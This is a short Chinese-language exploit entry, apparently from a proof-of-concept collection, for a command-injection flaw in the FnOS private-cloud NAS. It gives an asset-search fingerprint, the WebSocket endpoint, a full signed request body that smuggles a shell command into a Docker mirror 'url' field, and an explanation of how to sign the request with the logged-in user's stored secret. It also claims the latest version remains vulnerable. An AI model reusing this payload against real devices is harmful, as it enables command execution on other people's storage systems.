# 飞牛私有云FnOS存在命令执行漏洞

飞牛私有云 ｜ 命令执行 ｜ —
- **指纹**：`app="飞牛-私有云fnOS"`

**Payload**
```
测试 POC：
WebSocket 连接： http://IP:5666/websocket?type=main
请求 Body：
cA8dKVgUFNf/5QdKdIa7nEhaup6ObIo6D18J0am+KBQ={"reqid":"697da669697da3bc000000090f31","req":"appcgi.dockermgr.systemMirrorAdd","url":"https://test.example.com ; /usr/bin/touch /tmp/hacked20260131 ; /usr/bin/echo ","name":"2"}
JSON 前面的内容是 使用浏览器的 localStorage.fnos-Secret 内的值作为 Key 对后面的 JSON 进行 HMAC-SHA256
后的签名。因为这个 Secret 仅在登陆成功后才会设定，因此需要现有一个有效的账户。
payload 放在请求体的 URL 内，成功后会在 /tmp 下创建文件 hacked20260131 。
此漏洞在当前最新版 1.1.15-1493 中仍然存在。
如果这个版本还有问题，那说明前面还有一个 authorization bypass 漏洞（要么是验证不当，要么是 Nginx 反代配置不当）。
```
- **响应特征**：200